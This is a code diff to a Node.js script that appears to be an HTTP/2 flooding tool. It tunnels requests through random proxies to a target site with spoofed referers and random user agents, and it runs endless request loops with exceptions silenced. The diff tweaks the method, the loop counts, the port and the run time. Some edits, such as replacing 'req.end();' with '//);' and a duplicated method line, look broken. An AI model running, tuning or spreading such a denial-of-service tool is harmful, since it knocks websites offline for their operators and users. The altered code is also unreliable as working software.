@@ -59,6 +59,7 @@ class TlsBuilder {
         socket.setKeepAlive(true, 1000);
         socket.setTimeout(10000);
         payload[":method"] = "GET";
+        payload[":method"] = "POST";
         payload["Referer"] = objetive;
         payload["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]
         payload["Cache-Control"] = 'no-cache, no-store,private, max-age=0, must-revalidate';
@@ -77,16 +78,16 @@ class TlsBuilder {
                 host: parsed.host,
                 servername: parsed.host,
                 secure: true,
-                //echdCurve: this.curve,
+                echdCurve: this.curve,
                 honorCipherOrder: true,
                 requestCert: true,
-                secureOptions: this.Opt, //"SSL_OP_ALL",
+                secureOptions: this.Opt,
                 sigalgs: this.sigalgs,
                 rejectUnauthorized: false,
                 ALPNProtocols: ['h2'],
             }, () => {
                 
-        for (let i = 0; i < 12; i++) {
+        for (let i = 0; i < 10; i++) {
 
             setInterval(async () => {
                 await tunnel.request(payload).close()
@@ -103,20 +104,18 @@ const keepAliveAgent = new http.Agent({ keepAlive: true, maxSockets: Infinity, m
 
 function Runner(){
 
-    for (let i = 0; i < 120; i++) {
+    for (let i = 0; i < 10; i++) {
 var proxy = proxies[Math.floor(Math.random() * proxies.length)];
 proxy = proxy.split(':');
                     
 var req = http.get({ 
         host: proxy[0],
         port: proxy[1],
-        timeout: 10000,
         method: "CONNECT",
-        agent: keepAliveAgent,
-
-        path: parsed.host + ":443"
+        //agent: keepAliveAgent,
+        path: parsed.host + ":3000"
         });
-        req.end();
+        //);
     
         req.on('connect', (_, socket) =>  {
             BuildTLS.http2TUNNEL(socket);
@@ -133,7 +132,7 @@ setInterval(Runner)
 
 setTimeout(function(){
     process.exit();
-}, process.argv[3] * 1000);
+}, process.argv[3] * 30000);
 
 process.on('uncaughtException', function(er) {
 });
